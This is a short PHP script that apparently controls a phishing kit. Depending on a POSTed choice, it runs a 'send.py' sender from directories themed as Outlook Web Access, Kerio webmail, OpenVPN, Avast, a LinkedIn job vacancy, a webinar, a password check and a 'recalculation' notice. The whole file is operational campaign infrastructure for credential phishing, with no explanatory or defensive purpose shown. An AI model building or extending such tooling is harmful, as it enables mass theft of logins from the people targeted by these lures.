<?php
    if($_POST['send'] == "Outlook"){
    exec('cd /home/user-data/www/default/owa/auth/sender/; python send.py');    
	}
	if($_POST['send'] == "Kerio"){
	    exec('cd /home/user-data/www/default/webmail/login/sender/; python send.py');    
	}
	if($_POST['send'] == "checkpass"){
	    exec('cd /home/user-data/www/default/check/sender/; python send.py');    
	}
	if($_POST['send'] == "webinar"){
	    exec('cd /home/user-data/www/default/event/6f3249aa304055d6/sender/; python send.py');    
	}
	if($_POST['send'] == "vpn"){
	    exec('cd /home/user-data/www/default/openvpn/sender/; python send.py');    
	}
	if($_POST['send'] == "antivirus"){
	    exec('cd /home/user-data/www/default/avast/sender; python send.py');    
	}
	if($_POST['send'] == "LinkedIn"){
	    exec('cd /home/user-data/www/default/vacancy/sender; python send.py');    
	}
	if($_POST['send'] == "pereraschet"){
	    exec('cd /home/user-data/www/default/pereraschet/sender/; python send.py');    
	}
	if($_POST['send'] == "recalculation"){
	    exec('cd /home/user-data/www/default/recalculation/sender/; python send.py');    
	}
?>
